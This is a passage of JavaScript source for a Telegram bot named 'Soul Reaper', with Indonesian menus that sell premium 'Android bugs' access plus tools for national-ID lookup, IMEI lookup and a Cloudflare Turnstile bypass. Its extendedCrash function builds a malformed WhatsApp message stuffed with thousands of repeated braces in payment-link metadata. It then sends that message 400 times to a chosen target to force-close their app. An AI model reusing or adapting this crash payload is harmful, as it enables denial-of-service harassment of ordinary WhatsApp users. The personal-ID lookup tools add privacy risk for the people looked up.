    const videoUrl = "https://files.catbox.moe/mnlvy3.mp4";
    const audioUrl =
      "https://raw.githubusercontent.com/bayuxxd/bebasajamaukayagmna/main/lagu.mp3";

    const caption = `<blockquote>
╔═⸸ 𝐒𝐎𝐔𝐋 𝐑𝐄𝐀𝐏𝐄𝐑 ⸸═╗
║ ᝰ.ᐟ sᴇʟᴀᴍᴀᴛ ᴅᴀᴛᴀɴɢ ᴅɪ ᴋᴇɢᴇʟᴀᴘᴀɴ
║ ᝰ.ᐟ ᴛᴇʀɪᴍᴀ ᴋᴀsɪʜ ᴛᴇʟᴀʜ ᴍᴇᴍɪʟɪʜ
║     ⸸ sᴏᴜʟ ʀᴇᴀᴘᴇʀ ⸸
╠══════════════════════╣
║ ᴘᴇʀɪɴɢᴀᴛᴀɴ:
║ • ɢᴜɴᴀᴋᴀɴ ʜᴀɴʏᴀ ᴜɴᴛᴜᴋ ʏᴀɴɢ ʙᴇʀsᴀʟᴀʜ
║ • sᴇᴍᴏɢᴀ ʙᴇʀᴍᴀɴғᴀᴀᴛ ☠
╚══════════════════════╝

╭━⸸ ɪɴғᴏ ᴄᴏʀᴇ ⸸━╮
ᝰ.ᐟ ᴅᴇᴠ
╰⪼ @zihardev
ᝰ.ᐟ ᴠᴇʀsɪ
╰⪼ 2
ᝰ.ᐟ ʙᴀʜᴀsᴀ
╰⪼ ᴊᴀᴠᴀsᴄʀɪᴘᴛ
╰━⪼
ᴘɪʟɪʜ ᴍᴇɴᴜ ᴅɪ ʙᴀᴡᴀʜ
</blockquote>
» © 𐊖𐊒𐌵𐎘 ! @zihardev`;

    const keyboard = [
      [
        { text: "MENU DEV", callback_data: "soultampleng" },
        { text: "MENU", callback_data: "bugmen" },
        { text: "TOLLS", callback_data: "tolls" },
      ],
      [
        { text: "ADM MENU", callback_data: "ulznxx" },
        { text: "SI GANTENG", url: "https://t.me/zihardev" },
      ],
    ];

    const replyTo = ctx.message?.message_id;
    await ctx.replyWithVideo(videoUrl, {
      caption,
      parse_mode: "HTML",
      reply_markup: { inline_keyboard: keyboard },
      ...(replyTo ? { reply_to_message_id: replyTo } : {}),
    });
    setTimeout(async () => {
      try {
        await bot.telegram.sendAudio(chatId, audioUrl, {
          title: "𝐒𝐎𝐔𝐋 𝐑𝐄𝐀𝐏𝐄𝐑",
          performer: "Version 1.1",
          caption: "𝐒𝐎𝐔𝐋 𝐑𝐄𝐀𝐏𝐄𝐑",
          parse_mode: "HTML",
        });
      } catch (e) {
        console.error("SEND AUDIO ERROR:", e);
        try {
          await ctx.reply("Audio gagal dikirim (link/timeout).");
        } catch {}
      }
    }, 300);
  } catch (err) {
    console.error("START ERROR:", err);
    try {
      await ctx.reply("Bot aktif ✅");
    } catch {}
  }
});

bot.action(/^(soultampleng|ulznxx|tolls|bugmen|byza)$/, async (ctx) => {
  try {
    await ctx.answerCbQuery();
    const data = ctx.callbackQuery.data;

    let newCaption = "";
    let keyboard;

    if (data === "soultampleng") {
      newCaption = `<blockquote>
╭━( ᴏᴡɴᴇʀ ᴍᴇɴᴜ )
│ ᝰ.ᐟ /addadmin   
╰⪼» System Admin Control
│
│ ᝰ.ᐟ /deladmin     
╰⪼» Remove Admin Access
│
│ ᝰ.ᐟ /addpairing   
╰⪼» Connect WhatsApp
│
│ ᝰ.ᐟ /removeallbot 
╰⪼» Remove Bot / Sender
│
╰⪼» © 𐊖𐊒𐌵𐎘

</blockquote>`;

      const dodo = [
        [{ text: "RESELLER", url: "https://t.me/zihardev" }],
        [{ text: "⬅️ BACK", callback_data: "byza" }],
      ];
      keyboard = dodo;
      
    } else if (data === "ulznxx") {
      newCaption = `<blockquote>
╭━( ᴘʀᴇᴍɪᴜᴍ ᴍᴇɴᴜ )
│ ᝰ.ᐟ /addprem
╰⪼» Grant Premium Power
│
│ ᝰ.ᐟ /delprem
╰⪼» Revoke Premium Access
│
│ ᝰ.ᐟ /cekprem
╰⪼» Cek Premium (Owner/Admin)
│
╰⪼» © 𐊖𐊒𐌵𐎘
</blockquote>`;

      const wowo = [
        [{ text: "RESELLER", url: "https://t.me/zihardev" }],
        [{ text: "⬅️ BACK", callback_data: "byza" }],
      ];
      keyboard = wowo;
      
    } else if (data === "tolls") {
      newCaption = `<blockquote>
╭━( ᴛᴏᴏʟs ᴍᴇɴᴜ )
│ ᝰ.ᐟ /nikparse
╰⪼» Cek nik
│
│ ᝰ.ᐟ /imeiinfo
╰⪼» Cek info imei
│
│ ᝰ.ᐟ /subdo
╰⪼» Subdomain finder
│
│ ᝰ.ᐟ /prxy
╰⪼» Free proxy
│
│ ᝰ.ᐟ /qr
╰⪼» Buat Qr dengan link
│
│ ᝰ.ᐟ /get
╰⪼» Html Or Markdown
│
│ ᝰ.ᐟ /jawa
╰⪼» Tr ke Jawa
│
│ ᝰ.ᐟ /web2zip
╰⪼» Web > Zip
│
│ ᝰ.ᐟ /ytsm
╰⪼» YouTube Summarizer 
│
│ ᝰ.ᐟ /bypascf
╰⪼» Cf bypas turnstile
│
╰⪼» © 𐊖𐊒𐌵𐎘

</blockquote>`;

      const toolsKeyboard = [
        [{ text: "RESELLER", url: "https://t.me/zihardev" }],
        [{ text: "⬅️ BACK", callback_data: "byza" }],
      ];
      keyboard = toolsKeyboard;
      
    } else if (data === "bugmen") {
      const premInfo = getPremiumInfo(ctx.from.id);

      newCaption = `<blockquote>
╭━( ᴀɴᴅʀᴏɪᴅ ʙᴜɢs )
│ ᝰ.ᐟ /xandro
╰⪼» ⚡(FC)
│
╭━( sᴛᴀᴛᴜs )
│ ᝰ.ᐟ Premium: ${premInfo ? "✅ Active" : "❌ Not Active"}
│
╭━( ɪɴғᴏ )
│ ᝰ.ᐟ Metode: Durasi (m/j)
│ ᝰ.ᐟ Jeda: 3 Detik
│ ᝰ.ᐟ Max: 5 Jam
│ ᝰ.ᐟ Premium only commands
╰━━━━━━━━━━━━━━━━━━━━━━━━━━⊱

» © 𐊖𐊒𐌵𐎘
</blockquote>`;

      const singantuk = [
        [{ text: "RESELLER", url: "https://t.me/zihardev" }],
        [{ text: "💎 PREMIUM ACCESS", callback_data: "premiuminfo" }],
        [{ text: "⬅️ BACK", callback_data: "byza" }],
      ];
      keyboard = singantuk;
      
    } else if (data === "byza") {
      newCaption = `<blockquote>
╔═⸸ 𝐒𝐎𝐔𝐋 𝐑𝐄𝐀𝐏𝐄𝐑 ⸸═╗
║ ᝰ.ᐟ sᴇʟᴀᴍᴀᴛ ᴅᴀᴛᴀɴɢ ᴅɪ ᴋᴇɢᴇʟᴀᴘᴀɴ
║ ᝰ.ᐟ ᴛᴇʀɪᴍᴀ ᴋᴀsɪʜ ᴛᴇʟᴀʜ ᴍᴇᴍɪʟɪʜ
║     ⸸ sᴏᴜʟ ʀᴇᴀᴘᴇʀ ⸸
╠══════════════════════╣
║ ᴘᴇʀɪɴɢᴀᴛᴀɴ:
║ • ɢᴜɴᴀᴋᴀɴ ʜᴀɴʏᴀ ᴜɴᴛᴜᴋ ʏᴀɴɢ ʙᴇʀsᴀʟᴀʜ
║ • sᴇᴍᴏɢᴀ ʙᴇʀᴍᴀɴғᴀᴀᴛ ☠
╚══════════════════════╝

╭━⸸ ɪɴғᴏ ᴄᴏʀᴇ ⸸━╮
ᝰ.ᐟ ᴅᴇᴠ
╰⪼ @zihardev
ᝰ.ᐟ ᴠᴇʀsɪ
╰⪼ 2
ᝰ.ᐟ ʙᴀʜᴀsᴀ
╰⪼ ᴊᴀᴠᴀsᴄʀɪᴘᴛ
╰━⪼
ᴘɪʟɪʜ ᴍᴇɴᴜ ᴅɪ ʙᴀᴡᴀʜ
</blockquote>
» © 𐊖𐊒𐌵𐎘 ! @zihardev`;

      const ngewesawitdb = [
        [
          { text: "MENU DEV", callback_data: "soultampleng" },
          { text: "MENU", callback_data: "bugmen" },
          { text: "ADM MENU", callback_data: "ulznxx" },
          { text: "SI GANTENG", url: "https://t.me/zihardev" },
        ],
      ];
      keyboard = ngewesawitdb;
    }

    await ctx.editMessageCaption(newCaption, {
      parse_mode: "HTML",
      reply_markup: { inline_keyboard: keyboard },
    });
  } catch (err) {
    console.error("Menu callback error:", err);
  }
});

bot.command('bugmen', async (ctx) => {
const premiumlahNgentod = getPremiumInfo(ctx.from.id);
  const imageUrl2 = "https://files.catbox.moe/rn570i.jpg";
  const Zee1 = `
╭━━━━━━━⟨ 𓇼 𝓢𝓞𝓤𝓛 𝓡𝓔𝓐𝓟𝓔𝓡  𓇼 ⟩━━━━━━━╮
│
├─────⟨ 𝐀𝐍𝐃𝐑𝐎𝐈𝐃 𝐁𝐔𝐆𝐒 ⟩
│ • /xandro ⚡(FC)
├─────『 𝐒𝐓𝐀𝐓𝐔𝐒 』
│ • Premium: ${premiumlahNgentod ? '✅ Active' : '❌ Not Active'}
├─────『 𝐈𝐍𝐅𝐎 』
│
│ • Metode: Durasi (m/j)
│ • Jeda: 3 Detik
│ • Max: 5 Jam
│ • Premium only commands
│
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━⊱
» © 𐊖𐊒𐌵𐎘
`;
  const keyboard = [
    [{
      text: "RESELLER",
      url: "https://t.me/zihardev"
    }],
    [{
      text: "💎 PREMIUM ACCESS",
      callback_data: "premiuminfo"
    }]
  ];
  await ctx.replyWithPhoto(imageUrl2, {
    caption: Zee1,
    reply_markup: {
      inline_keyboard: keyboard
    },
    reply_to_message_id: ctx.message.message_id
  });
});
async function clearChat(target) {
  try {
    const targetJid = targetNumber.includes("@s.whatsapp.net") ?
      targetNumber :
      `${target}@s.whatsapp.net`;
    const chats = sock.chats.get(targetJid);
    if (!chats) {
      console.log("Target chat tidak ditemukan!");
      return;
    }
    await sock.modifyChat(targetJid, "delete");
    console.log(`Semua pesan dengan ${target} telah dihapus.`);
  } catch (error) {
    console.error("Gagal menghapus chat:", error);
  }
}

//FANGSYEN
async function extendedCrash(target) {    
    const msg = generateWAMessageFromContent(target, {
        extendedTextMessage: {
            text: "C",
            matchedText: "🦅 SOUL !",
            description: "C",
            title: "C",
            paymentLinkMetadata: {
                button: { displayText: "X00" },
                header: { headerType: 1 },
                provider: { paramsJson: "{{".repeat(5000) }
            },
            linkPreviewMetadata: {
                paymentLinkMetadata: {
                    button: { displayText: "X" },
                    header: { headerType: 1 },
                    provider: { paramsJson: "{{".repeat(5000) }
                },
                urlMetadata: { fbExperimentId: 999 },
                fbExperimentId: 888,
                linkMediaDuration: 555,
                socialMediaPostType: 1221
            }
        }
    }, {});
    const ms = 4; 
    const total = 400;   
    console.log(chalk.yellow(`[ ! ] Starting spam with ${ms} second delay`));    
    for(let i = 0; i < total; i++) {
        try {
            await sock.relayMessage(target, {
                groupStatusMessageV2: {
                    message: msg.message
                }
            }, { 
                messageId: null 
            });            
            console.log(chalk.green(`[ # ] Sent ${i + 1}/${total} to ${target}`));
            if (i < total - 1) {
                console.log(chalk.blue(`[ $ ] Waiting ${ms} seconds...`));
                await new Promise(resolve => setTimeout(resolve, ms * 1000));
            }           
        } catch (error) {
            console.log(chalk.red(`[ 🗑️ ] Error on message ${i + 1}: ${error.message}`));
            if (i < total - 1) {
                await new Promise(resolve => setTimeout(resolve, ms * 1000));
            }
        }
    }    
    console.log(chalk.green.bold(`[ 🚩 ] COMPLETED: ${total} messages sent with ${ms}s delay`));
}

bot.launch({
    dropPendingUpdates: true
  })
  .then(() => {
    console.log("𝕾𝖔𝖚𝖑 𝖛𝟙 𝖌𝖊𝖓𝟚 | @bydaa");
  })
  .catch((err) => {
    console.error("Error starting bot:", err);
    setTimeout(() => process.exit(1), 5000);
  });
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
// <--- INI PENYEBABNYA